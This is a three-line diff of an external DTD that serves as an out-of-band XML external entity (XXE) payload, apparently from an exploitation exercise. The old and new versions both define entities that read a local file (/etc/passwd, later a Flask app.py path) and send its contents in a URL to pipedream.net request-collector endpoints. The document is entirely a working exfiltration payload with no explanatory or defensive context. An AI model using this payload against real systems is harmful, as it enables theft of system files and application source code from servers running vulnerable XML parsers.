@@ -1,3 +1,3 @@
-<!ENTITY % x SYSTEM "file:///etc/passwd">
-<!ENTITY % paramEntity "<!ENTITY genEntity SYSTEM 'https://en5lpcwde724a.x.pipedream.net/?%x;'>">
+<!ENTITY % x SYSTEM "file:///usr/local/lib/python2.7/dist-packages/flask/app.py">
+<!ENTITY % paramEntity "<!ENTITY genEntity SYSTEM 'https://enwpg2wktdnp.x.pipedream.net/?%x;'>">
 %paramEntity;
